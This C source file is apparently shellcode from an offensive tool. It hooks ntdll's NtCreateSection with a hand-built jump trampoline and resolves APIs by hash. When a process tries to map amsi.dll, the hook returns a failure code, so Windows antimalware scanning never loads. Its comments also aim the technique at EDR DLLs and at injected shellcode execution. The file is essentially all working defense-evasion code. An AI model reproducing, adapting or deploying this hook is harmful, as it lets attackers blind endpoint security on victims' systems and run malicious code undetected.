#include "APIResolve.h"

// Without this function(S) defined, we'll get  undefined reference to `___chkstk_ms' errors when compiling, so we just overwrite it.
void ___chkstk_ms()
{
    return;
}

// Also got compiler errors for missing strlen (although it's actually not used, so a dummy function here)
SIZE_T strlen(const char* _Str)
{
    return 0;
}


VOID __attribute__((noinline))my_memcpy(void* dest, void* src, size_t n)
{
    char* csrc = (char*)src;
    char* cdest = (char*)dest;

    for (int i = 0; i < n; i++) {
        cdest[i] = csrc[i];
    }
};


typedef __stdcall NTSTATUS(WINAPI* myNtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
    ); //define NtCreateSection

NTSTATUS restore_hook_ntcreatesection(HANDLE* hSection, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
BOOL hook_ntcreateSection();


void firstRun() { // Just used as global counting "variable". We cannot use global variables when writing PIC. This needs to be removed/changed if you want to improve for RX memory permissions, as we need WRITE to increase it.
    asm(".byte 0x00");
}

void originalBytes() { // used to store the original bytes of the function we are hooking. This function can be used in PIC to exchange information between functions, as global variables cannot be used. Thanks @Mr-Un1k0d3r for the hint.
    asm(".byte 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37 ");
}

__stdcall NTSTATUS restore_hook_ntcreatesection(HANDLE* hSection, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle)
{
    uint64_t _NtProtectVirtualMemory = getFunctionPtr(HASH_NTDLL, HASH_NTPROTECTVIRTUALMEMORY);
    uint64_t _ntCreateSection_address = getFunctionPtr(HASH_NTDLL, HASH_NTCREATESECTION);

    myNtCreateSection NtCreate;
    NtCreate = (myNtCreateSection)_ntCreateSection_address;
    myNtCreateSection ProtectPointer = NtCreate;
    DWORD oldprotect;
    SIZE_T syscallSize = (SIZE_T)24;

    // Temporarily set RWX, so that we can place the hook again. The strange thing is, we need the EXECUTE permissions, otherwise it  will crash. 
    // Although nothing should get executed here in that moment. I cannot explain that to myself, maybe someone reading this comment? ;-)
    NTSTATUS returnValue = ((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&ProtectPointer, (PULONG)&syscallSize, PAGE_EXECUTE_READWRITE, &oldprotect);
    if(returnValue == 0)
    {
        my_memcpy(NtCreate, originalBytes, 24); // Write the real NtCreateSection in the address of the hook
    }
    // Restore RX for execution. Restoring RX here in combination with setting back RWX in the hook function results in amsi not being blocked successfully.
    //SIZE_T syscallSize2 = (SIZE_T)24;
    //myNtCreateSection ProtectPointer2 = NtCreate;
    //returnValue = ((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&ProtectPointer2, (PULONG)&syscallSize2, PAGE_EXECUTE_READ, &oldprotect);
    NTSTATUS originalReturn = 0;
    //if (returnValue == 0)
    //{

        // Call the real NtCreateSection with original parameters.
        originalReturn =  NtCreate(hSection, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
    //}
    //else
    //{
    //    originalReturn = 1;
    //}
    if (hook_ntcreateSection()) //re-hook it
    {
		return originalReturn;
	}
	else
	{
		return -1;
    }
    
}

// We need a function, that manually does the same than strlen() does as we cannnot use that here
int __attribute__((noinline)) my_strlen(char* str)
{
	int i = 0;
	while (str[i] != '\0') {
		i++;
	}
	return i;
}

// Manually doing the work of StrStrIA Win32 API, it has to compare two char arrays and return true if the first one contains the second one.
// StrStrIA itself cannot be used, as EDR DLLs are usually loaded directly after ntdll which means Shlwapi is not loaded.
// Also trying to load Shlwapi.dll before the process is initialized (where our hook takes place) will fail.
BOOL StrStrIA(char* str1, char* str2)
{
	int i = 0;
	int j = 0;
    // strlen cannot be used here in PIC mode, so we need an alternative function
	int len1 = my_strlen(str1);
    int len2 = my_strlen(str2);
	while (i < len1) {
		if (str1[i] == str2[j]) {
			i++;
			j++;
			if (j == len2) {
				return 1;
			}
		}
		else {
			i = i - j + 1;
			j = 0;
		}
	}
	return 0;
}

// A function that compares two char arrays and returns 0 if they are equal.
int my_charcmp(char str1[], char str2[], int length)
{
	int i = 0;
	while (i < length) {
		if (str1[i] != str2[i]) {
			return 1;
		}
		i++;
	}
	return 0;
}

// A function, that takes char* as input and increases the value of that char by one.
void increaseChar(char* str)
{
	char increase[1] = { 0x01 };
	char newvalue = *str;
	newvalue = newvalue + increase[0];
	
	*str = newvalue;
}

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }

// A logging function, that takes a char array as input and logs all provided inputs into a text file on disk. 
// This function needs to only use ntdll.dll functions, as we cannot use any other Windows APIs in this case (Process not fully initialized yet).
void __attribute__((noinline)) log_to_file(PWCHAR input) {

    uint64_t _NtCreateFile = getFunctionPtr(HASH_NTDLL, HASH_NTCREATEFILE);
    uint64_t _NtWriteFile = getFunctionPtr(HASH_NTDLL, HASH_NTWRITEFILE);
    uint64_t _RtlInitUnicodeString = getFunctionPtr(HASH_NTDLL, HASH_RTLINITUNICODESTRING);
    //uint64_t _InitializeObjectAttributes = getFunctionPtr(HASH_NTDLL, HASH_INITIALIZEOBJECTATTRIBUTES);
    uint64_t _NtClose = getFunctionPtr(HASH_NTDLL, HASH_NTCLOSE);

    // we need to create a UNICODE_STRING struct, that contains the path to the log file
    UNICODE_STRING file_path;
    wchar_t logPathString[] = { '\\', '?', '?', '\\', 'C', ':', '\\','w','i','n','d','o','w','s','\\','t','e','m','p','\\', 'l', 'o', 'g', '.', 't', 'x', 't', '\0' };
    PWCHAR logPath = (PWCHAR)&logPathString;
    ((RTLINITUNICODESTRING)_RtlInitUnicodeString)(&file_path, logPath/*L"C:\\windows\temp\log.txt"*/);

    // create a file
    HANDLE file_handle;
    IO_STATUS_BLOCK io_status;
    OBJECT_ATTRIBUTES obj_attributes;
    InitializeObjectAttributes(&obj_attributes, &file_path, 0x00000040 /*OBJ_CASE_INSENSITIVE*/, NULL, NULL);
    NTSTATUS status = ((NTCREATEFILE)_NtCreateFile)(&file_handle, FILE_ALL_ACCESS, &obj_attributes, &io_status, NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        0x00000002/*FILE_CREATE*/,
        0x00000020/*FILE_SYNCHRONOUS_IO_NONALERT*/,
        NULL,
        0);

if (status != 0) {
    status = ((NTCREATEFILE)_NtCreateFile)(&file_handle, FILE_APPEND_DATA | SYNCHRONIZE, &obj_attributes, &io_status, NULL,
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, 3/*FILE_OPEN_IF*/, 0x00000020/*FILE_SYNCHRONOUS_IO_NONALERT*/,
        NULL,
        0);
}

// actually write into that file
UNICODE_STRING input_string;
((RTLINITUNICODESTRING)_RtlInitUnicodeString)(&input_string, input);
((NTWRITEFILE)_NtWriteFile)(file_handle, NULL, NULL, NULL, &io_status, input_string.Buffer, input_string.Length, NULL, NULL);
((NTCLOSE)_NtClose)(file_handle);
}

// A function, that does the same as GetFinalPathNameByHandleA. It takes a Handle, a char array and a length as input and returns the path of the file in the char array. This can be done with the ntdll NtQueryInformationFile
// function and the FILE_NAME_INFORMATION struct. GetFinalPathNameByHandleA itself cannot be used, as EDR DLLs are usually loaded directly after ntdll which means kernel32.dll is not loaded yet.
// Also trying to load kernel32.dll before the process is initialized (where our hook takes place) will fail.

BOOL __attribute__((noinline)) my_GetFinalPathNameByHandleA(HANDLE hFile, char* path, int length)
{
    uint64_t _NtQueryInformationFile = getFunctionPtr(HASH_NTDLL, HASH_NTQUERYINFORMATIONFILE);
    uint64_t _RtlUnicodeToMultiByteN = getFunctionPtr(HASH_NTDLL, HASH_RTLUNICODETOMULTIBYTEN);
    if (_NtQueryInformationFile == 0 || _RtlUnicodeToMultiByteN == 0)
    {
        return FALSE;
    }
    else
    {
        char buffer[0x1000];
        FILE_NAME_INFORMATION* nameInfo = (FILE_NAME_INFORMATION*)buffer;
        IO_STATUS_BLOCK ioStatusBlock;
        NTSTATUS status = ((NTQUERYINFORMATIONFILE)_NtQueryInformationFile)(hFile, &ioStatusBlock, nameInfo, 0x1000, FileNameInformation);

        if (status == 0)
        {

            ULONG size = 0;
            ((RTLUNICODETOMULTIBYTEN)_RtlUnicodeToMultiByteN)(path, length, &size, nameInfo->FileName, nameInfo->FileNameLength);
            path[size] = 0;

            return TRUE;
        }
        else
        {
            wchar_t log[] = { '\r','\n','[','*',']',' ','F','a','i','l','e','d',' ','t','o',' ','q','u','e','r','y',' ','f','i','l','e',' ','i','n','f','o','!','\0' };
            PWCHAR first = (PWCHAR)&log;
            log_to_file(first);

            return FALSE;
        }
    }
}


__stdcall NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle)
{
    wchar_t log[] = { '\r','\n','[', '+', ']', ' ', 'I', 'n', ' ', 't', 'h', 'e', ' ', 'h', 'o', 'o', 'k', '!', '\r','\n', 0 };
    PWCHAR first = (PWCHAR)&log;
    log_to_file(first);

    BOOL nomoreSkip = FALSE;
    char check[1] = { 0x00 };

    // There are some use cases (e.G. ThreadlessInject Shellcode execution), in which we don't want to interrupt the process initialization (which also uses NtCreateSection).
    // For those Use-Cases, we have the option to skip one or more NtCreateSection Calls before actually doing something in the hook function.
    // Uncommented, as this function leads to us needing RWX Permissions all over the time. And the hook looks "better" when set to RX only.
    
	if (my_charcmp((char*)firstRun, (char*)&check, 1) == 0) // process initialization only called NtCreateSection once in my tests
    {
        nomoreSkip = TRUE;
    }
    else
    {
        // increase the value of firstRun by once
        increaseChar((char*)firstRun);
    }
    


    char* lpFilename[256];
    if ((FileHandle != NULL) && nomoreSkip == TRUE)
    {
        if (my_GetFinalPathNameByHandleA(FileHandle, (char*)lpFilename, 256) != 0)
        {

            char amsiShort[] = /*amsi.dll */{ 'a', 'm', 's', 'i', '.', 'd', 'l', 'l', 0 };

            if (StrStrIA((char*)lpFilename, (char*)amsiShort))
            {

                wchar_t log2[] = { '\r','\n','[', '+', ']', ' ', 'A', 'M', 'S', 'I', ' ', 'l', 'o', 'a', 'd', ' ', 'i', 'n','t','e','r','c','e', 'p', 't', 'e', 'd', '!', '\r','\n','\0' };
                PWCHAR amsiLog = (PWCHAR)&log2;
                log_to_file(amsiLog);

                return 0xC0000054; // 0 does not work here, as Powershell than tries to use AMSI and the process crashes. So we're using STATUS_FILE_LOCK_CONFLICT to inform about the Section wasn't creatable.
                // but 0 might is the better approach for EDR DLLs, as you won't prompt an GUI error notification with that.

            }
            
        }
    }
    // we are going to return the NTSTATUS of the original function afterwards
    return restore_hook_ntcreatesection(hSection, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);

}


BOOL hook_ntcreateSection()
{
    // The following function makes us need to have RWX permissions for the Shellcode.
    // Instead you could also egg-hunt and replace the correct address before injecting or use a different technique such as Hardware Breakpoints.
    char trampoline_MyNtCreateSection[13] = {
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, Address of our function
    0x41, 0xFF, 0xE2                                                    // jmp r10
    };

    void* hProc = (void*)getFunctionPtr(HASH_NTDLL, HASH_NTCREATESECTION);
    //uint64_t _NtProtectVirtualMemory = getFunctionPtr(HASH_NTDLL, HASH_NTPROTECTVIRTUALMEMORY);

    myNtCreateSection NtCreate;
    NtCreate = (myNtCreateSection)hProc;

    //DWORD written;
    //SIZE_T syscallSize = (SIZE_T)24;

    void* reference = (void*)ntCreateMySection;

    my_memcpy(&trampoline_MyNtCreateSection[2], &reference, sizeof reference); //Copy  the hook to tramp_ntcreatesection

    // The strange thing is, we need the EXECUTE permissions, otherwise it  will crash. We cannot use PAGE_READWRITE.
    // Although nothing should get executed here in that moment. Maybe other ntdll.dll functions in that 4kb section? I cannot explain that to myself, maybe someone reading this comment? ;-)
    /*NTSTATUS returnValue = *///((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&NtCreate, (PULONG)&syscallSize, PAGE_EXECUTE_READWRITE, &written);
    /*if(returnValue == 0)
    {*/
        my_memcpy((LPVOID*)NtCreate, &trampoline_MyNtCreateSection, sizeof trampoline_MyNtCreateSection); // actually do the hook by overwriting the original NtCreateSection
    //}

    // restoring RX at this point also leads to a crashing process on Win11, but on Win10 the second execution works perfectly fine. O.o
    // So for best stability we might have to accept RWX for the NtCreateSection address.
    //syscallSize = (SIZE_T)24;
    //myNtCreateSection reProtect = hProc;
    //NTSTATUS returnValue = ((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&reProtect, (PULONG)&syscallSize, PAGE_EXECUTE_READ, &written);

    /*if(returnValue == 0)
    {*/
        return TRUE;
    /*}
    else
    {
        return FALSE;
    }*/
}

__stdcall void ruylopez(HANDLE* SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle)
{

	ntCreateMySection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);

}
